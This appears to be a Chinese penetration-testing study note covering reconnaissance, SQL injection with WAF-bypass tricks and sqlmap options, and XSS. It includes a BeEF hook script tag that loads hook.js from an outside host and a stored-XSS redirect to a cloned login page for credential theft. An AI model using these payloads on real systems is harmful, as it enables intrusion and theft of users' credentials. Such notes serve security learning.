信息收集

域名信息收集

www等是主机头，后面两个是域名。

whois用来查询域名是否已经被注册以及注册域名的人的详细信息。

WHOIS协议是先与whois服务器的TCP43端口建立连接，发送关键字并回车换行，然后接收服务器的查询结果。

Whois查询方法：第三方web查询网站，kali下whois命令whois baidu.com。

ICP备案查询：第三方web网站接口查询

顶级域名（一级域名）：.com, .net, .org, .cn等

再往前就都是子域名，又分为二级子域名，三级子域名

方法一：使用子域名挖掘工具Maltego，wydomain（暴力破解，第三方网站API）

方法二：搜索引擎高级命令site:baidu.com

方法三：使用第三方网站查询，dnsdumpster.com

方法四：https证书公开日志，crt.sh censys.io

方法五：在线暴力破解，phpinfo.me/domain

Web站点信息

cms指纹识别，在线工具以及本地工具 whatweb命令

利用 bug.shuimugan.com 查询指定CMS的漏洞

敏感文件探测：使用御剑，wwwscan，dirb，dirburst等命令探测sitemap.xml，test.txt等文件

使用 wpscan 命令专门测试wordpress的站点信息

端口信息收集

端口范围是从0到65535（2^16-1）

windows使用netstat -anbo来显示开放端口，linux使用netstat -pantu

收集端口开放状态：使用TCP、UDP等协议发送数据包，查看返回的数据包来判断端口状态

方法一：使用nmap或masscan等工具，nmap -A -v -T4 IP

方法二：使用在线端口探测网站，tool.chinaz.com/port/

攻击举例：22开放ssh，23开放telnet（爆破），3389开放rdp远程桌面（shift后门），5900开放VNC远程连接（弱口令rce）

防御：关闭不必要端口，加防火墙，经常更换密码，经常更新软件打补丁

敏感信息收集

google hack：site，inurl，intext，filetype，intitle，link，info。参考网站：https://www.exploit-db.com/google-hacking-database/

响应头中的Server头和X-Powered-By头会暴露服务器容器和编程语言信息，获取方式：浏览器f12，burpsuite，python-requests

github之邮件配置信息泄露，数据库信息泄露，svn信息泄露，综合信息泄露

收集真实IP

CDN（Content Delivery Network）内容分发网络，根据用户所在的地区来确定访问的缓存服务器。

通过Ping判断是否存在cdn：发现ping的域名变成了temp.p32.tc.cdntip.com

根据各地ping的ip是否相同判断是否存在cdn

如何绕过cdn找到真实ip：收集内部邮箱服务器ip地址，网站phpinfo文件，查询分站的子域名ip地址（有可能分站没上cdn），国外访问，查询域名解析记录

验证：真实ip地址能直接返回站点信息

SQL注入

在与用户的交互程序中，用户的输入拼接到了SQL语句中，执行了与原计划不同的行为，从而产生SQL注入漏洞。

Mysql基础知识

Mysql 5.0默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata(数据库名)、tables(表名)、columns(列名或字段名)

在schemata表中，schemata_name字段用来存储数据库名

在tables表中，table_schema和table_name分别用来存储数据库名和表名

在coumns表中，table_schema(数据库名)、table_name(表名)、column_name(字段名)

SQL增删改查：

user()：查看当前mysql的登录用户名

database()：查看当前使用mysql的数据库名

version()：查看当前mysql的版本

limit m,n ：表示从m行开始，往后n个，索引从0开始

常用注释：#井号，–空格，或/**/，浏览器会将url最后的空格删掉，所以需要把空格url编码成%20，或者改成–+

内联注释：/*! SQL语句 */只有mysql仍可以执行里面的语句，常用来绕过waf

SQL注入分类

按照参数类型可分为两种：数字型，字符型和搜索型：

按照数据库返回的结果，分为回显注入、报错注入、盲注：

回显注入：可以直接在存在注入点的当前页面中获取返回结果。

报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。

盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。

按照注入位置及方式不同分为：UA注入，Referer注入，Cookie注入，Cookie base64编码注入等。

联合查询

时间盲注

在SQL注入过程中，无论注入是否成功，页面完全没有变化。此时只能通过使用数据库的延时函数来判断注入点一般采用响应时间上的差异来判断是否存在SQL注入，即基于时间型的SQL盲注。

布尔盲注

在SQL注入过程中，应用界面仅仅返回True（页面）或者False（页面）。无法根据应用程序的返回页面得到需要的数据库信息。可以通过构造逻辑判断（比较大小）来得到需要的信息。

报错注入

宽字节注入

输入%df'，php中通过addslashes或者mysql_real_escape_string函数或者其他手动添加转义反斜杠的方式把输入转义成%df\'，url编码反斜杠成%df%5c%27，如果mysql的编码是GBK的话，就会认为成这是運'

除了%df，GBK的首字节对应0x81-0xFE，尾字节对应0x40-0xFE(除0x7F)。

二次注入

注册的时候提交了一个带引号的这种特殊构造的用户名admin'#，接下来登录该帐号后进行修改密码，此时sql语句变成了UPDATE users SET passwd="New_Pass" WHERE username ='admin' # ' AND password='

也就是执行了UPDATE users SET passwd="New_Pass" WHERE username ='admin'，也就是修改了admin的密码。

SQL绕过方式

  1. 大小写绕过，union替换成UniON
  2. 双写绕过，union替换成uniunionon
  3. 编码绕过，使用十六进制编码或者url编码，绕过检测过滤，但mysql仍能识别执行
  4. 内联注释，/*!select*/等同于select
  5. 注释符#或者–+的绕过可以使用or ‘1’=’1，来接上后面的单引号，就可以不使用注释符了
  6. and替换成&&，or 替换成||，或者an/**/d
  7. 空格被过滤的话可以使用%20，%0a，%09来编码绕过

  2. sqlmap对单一url探测 sqlmap.py -u "http://www.target.com/vul.php?id=1" --banner
  3. sqlmap从文件读取目标：-l，-x，-m，**-r**，-c
  4. sqlmap利用google获取目标 sqlmap.py -g "inurl:.php?id=1"
  5. sqlmap设置具体HTTP请求方法 --method=PUT
  6. sqlmap设置POST方法以及设置POST内容 --data="name=admin&passwd=admin&submit=Submit"
  7. sqlmap如果需要特殊指定数据的分隔符而不用默认的&符号 --data="query=foobar;id=1" --param-del=";"
  8. sqlmap使用登录后的cookie进行后续的注入测试 --cookie "security=low; PHPSESSID=8h3hn..."，如果对cookie值进行sql注入探测，需要设置–level 2以上
  9. sqlmap设置User-Agent 使用随机头--random-agent 或者使用自定义头 --user-agent="Mozilla/5.0 ..."，如果对UA的值进行sql注入测试，需要设置–level 3
  10. sqlmap设置HTTP主机头 --host="http://www.test.com"，如果对主机头进行sql注入测试，需要设置–level 5
  11. sqlmap设置HTTP Referer参数 --referer=127.0.0.1，如果想对Referer进行sql注入测试，需要设置–level 3
  12. sqlmap如果想自定义其他header头 --headers="Host:www.test.com\nUser-agent:Firefox"
  13. sqlmap设置HTTP协议认证参数 --auth-type 和 --auth-cred，–auth-type支持Basic、Digest、NTLM，sqlmap.py -u "http://x.com/1.php?id=1" --auth-type Basic --auth-cred "username:password"
  14. sqlmap设置代理参数--proxy+代理地址, --proxy-cred+代理服务器账号密码, --proxy-file+保存多个代理ip的文件, --ignore-proxy+忽略系统挂的总代理，--proxy "http://1.2.3.4:8080" --proxy-cred admin:1234
  15. sqlmap设置tor网络的参数 --tor, --tor-port, --tor-type: HTTP HTTPS SOCKS4 SOCKS5, --check-tor
  16. sqlmap设置发包延迟 --delay 0.5
  17. sqlmap设置超时 --timeout 10.5

  19. sqlmap设置随机化参数，并且每次请求中该参数的长度和类型与提供的原始值保持一致 -u "...?id=1" --randomize id
  20. sqlmap设置日志过滤目标，利用-l去读取日志文件，然后自己设置正则表达式过滤出相应的目标 sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
  21. sqlmap设置忽略偶尔显示401(未授权)的错误 --ignore-401

  23. sqlmap设置安全模式，如果执行过多不成功请求被服务器销毁 --safe-url, --safe-post, --safe-req, --safe-freq来访问足够多的安全页面再进行一次sql注入
  24. sqlmap忽略url编码，某些情况下需要使用原始信息非编码的方式发送数据，--skip-urlencode
  25. sqlmap设置持久连接，http报文头中为Connection:Keep-Alive，--keep-alive

XSS

跨站脚本攻击(Cross Site Scripting)

反射型

非持久性XSS，构造包含XSS代码的链接发送给用户，用户点击时，服务器接受该请求并处理，把带有XSS的代码发送给用户，浏览器解析执行XSS代码触发漏洞。

存储型

持久性XSS，发帖内容嵌入XSS代码，帖子被存到数据库中，当用户访问该帖子就会触发XSS。

DOM型

DOM全称Document Object Model，使用DOM动态访问更新文档的内容，结构及样式。服务器响应不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理XSS代码触发XSS漏洞。

就是url接收到参数，然后浏览器来做以下操作，利用DOM操作创建一个标签，并按照这个参数赋值，如果这个参数是script那么就相当于创建一个script脚本执行XSS。

XSS篡改网页链接

Kali自带beef-xss工具进行恶意链接生成，以及利用hook.js执行其他命令<script src="http://192.168.1.1:3000/hook.js"></script>

XSS盗取用户信息

原理：克隆网站登陆页面，原始站点有存储XSS漏洞，添加跳转的XSS payload之后，每次用户访问原始网站都会被跳转到克隆网站，输入用户名密码就被窃取了。

kali下有setookit工具克隆网站

存储型XSS跳转克隆网站payload：<script>window.location="http://克隆网站地址"</script>

当用户输入信息之后，setookit会返回相应的信息。
